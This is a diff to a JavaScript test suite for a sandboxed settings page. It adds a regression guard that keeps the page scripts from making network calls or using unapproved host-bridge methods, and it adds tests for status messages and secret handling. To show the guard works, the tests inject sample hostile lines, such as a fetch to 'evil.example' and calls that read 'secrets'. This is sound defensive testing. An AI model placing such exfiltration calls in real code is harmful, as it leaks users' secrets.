@@ -9,6 +9,42 @@ test("the shared validator remains available after its module is cached", async 
  expect(globalThis.__nowledgeMemValidateOptions).toBe(validator)
 })
 
+// The sandboxed page must not acquire network or additional host privileges.
+// These checks are a regression guard, not a JavaScript security parser.
+function pageCalls(source) {
+ return [...source.matchAll(/\bmagpie\s*(?:\?\.|\.)\s*([\w$]+(?:\s*(?:\?\.|\.)\s*[\w$]+)*)/g)]
+   .map(([,call]) => call.replace(/\s/g, "").replaceAll("?.", "."))
+}
+function pageScriptAllowed(source, allowedCalls) {
+ if (/\b(fetch|XMLHttpRequest|WebSocket|EventSource)\b/.test(source)) return false
+ if (/\bmagpie\s*\[|\b(?:window|globalThis)\s*\[\s*["']magpie["']\s*\]/.test(source)) return false
+ return pageCalls(source).every((call) => allowedCalls.includes(call))
+}
+
+test("page scripts use only the released bridge and do not perform network calls", async () => {
+ const read=(file)=>Bun.file(new URL(`./page/${file}`,import.meta.url)).text()
+ const [settings,validator,dictionary,html]=await Promise.all([read("settings.js"),read("validate.js"),read("i18n.js"),read("settings.html")])
+ const allowed=["service","options.get","options.set","theme.lang","ready.then","onTheme"]
+ expect(pageScriptAllowed(settings,allowed)).toBe(true)
+ expect([...new Set(pageCalls(settings))].sort()).toEqual([...allowed].sort())
+ expect(pageScriptAllowed(validator,[])).toBe(true)
+ expect(pageScriptAllowed(dictionary,[])).toBe(true)
+ const tags=[...html.matchAll(/<script\b([^>]*)>/gi)]
+ expect(tags).toHaveLength(4)
+ const sources=tags.map(([,attrs])=>attrs.match(/(?:^|\s)src\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i)?.slice(1).find((s)=>s !== undefined))
+ expect(sources.sort())
+   .toEqual(["_magpie/bridge.js","i18n.js","settings.js","validate.js"])
+ expect(html).not.toMatch(/<script\b(?![^>]*\bsrc\s*=)[^>]*>/i)
+ expect(html).not.toMatch(/\b(?:src|href)\s*=\s*(?:["']\s*)?(?:https?:)?\/\//i)
+ // Prove that each checked source rejects both classes of regression.
+ for (const [source,calls] of [[settings,allowed],[validator,[]]]) {
+  expect(pageScriptAllowed(`${source}\nfetch("https://evil.example/x")`,calls)).toBe(false)
+  expect(pageScriptAllowed(`${source}\nmagpie.read?.("secrets")`,calls)).toBe(false)
+  expect(pageScriptAllowed(`${source}\nwindow.magpie?.read("secrets")`,calls)).toBe(false)
+  expect(pageScriptAllowed(`${source}\nmagpie["read"]("secrets")`,calls)).toBe(false)
+ }
+})
+
 async function pageFixture(initial) {
   const read = (file) => Bun.file(new URL(`./page/${file}`, import.meta.url)).text()
   const [dictionary, validator, source, html] = await Promise.all([read("i18n.js"), read("validate.js"), read("settings.js"), read("settings.html")])
@@ -35,7 +71,7 @@ async function pageFixture(initial) {
 test("released hosts save only edited fields using a fresh read and retain secrets", async () => {
  const f=await pageFixture({serverUrl:"http://127.0.0.1:14242",apiKey:"saved_secret",custom:{a:1}}), e=f.elements
  expect(e.configure.disabled).toBe(false)
- expect(e.configured.dataset.message).toBe("legacySave")
+ expect(e.configured.dataset.message).toBe("loaded")
  await e.configure.onclick()
  expect(e.save.disabled).toBe(false)
  e.space.value="space-2"
@@ -43,6 +79,18 @@ test("released hosts save only edited fields using a fresh read and retain secre
  await f.save()
  expect(f.get()).toEqual({serverUrl:"http://127.0.0.1:14242",apiKey:"new_secret",custom:{a:2},future:true,spaceId:"space-2"})
  expect(f.writes()).toBe(1)
+})
+
+test("connection status stays separate from the concurrency notice", async () => {
+ for (const [options,status] of [[{},"notConfigured"],[{serverUrl:"https://mem.example"},"loaded"]]) {
+  const f=await pageFixture(options), e=f.elements
+  expect(e.configured.dataset.message).toBe(status)
+  await e.configure.onclick()
+  expect(e.configured.dataset.message).toBe(status)
+  const notice=f.translated.find((el)=>el.dataset.t === "concurrencyHelp")
+  expect(notice.textContent).toBe(f.i18n.messages.en.concurrencyHelp)
+  expect(notice.textContent).toMatch(/another editor saving at the same moment can still overwrite/)
+ }
 })
 
 test("secret controls keep, replace and clear the saved value", async () => {
